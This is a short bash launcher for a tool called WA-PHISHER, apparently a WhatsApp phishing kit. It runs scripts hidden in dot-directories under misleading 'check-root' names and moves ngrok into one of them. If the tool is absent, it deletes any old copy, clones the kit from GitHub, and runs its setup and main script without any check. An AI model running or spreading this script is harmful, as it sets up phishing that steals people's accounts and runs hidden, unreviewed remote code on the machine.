#!/bin/bash
# Code : GH05T HUNTER5
# Do not upload this tool to your GitHub without my consent
# Collaborator : GH05T-HUNTER5
clear
if [ -f ngrok ]; then
echo ""
echo ""
bash .empty/check-root.sh
bash .empty1/check-root.sh
bash .empty2/check-root.sh
bash .empty3/check-root.sh
bash .empty4/check-root.sh
bash .empty5/check-root.sh
bash .empty6/check-root.sh
bash .empty8/check-root.sh
bash .empty9/check-root.sh
clear
mv ngrok .empty7
python .empty7/check-root.py
else
cd
rm -rf WA-PHISHER
clear
git clone https://github.com/GH05T-HUNTER5/WA-PHISHER
cd WA-PHISHER
bash setup
python WA-PHISHER.py
fi
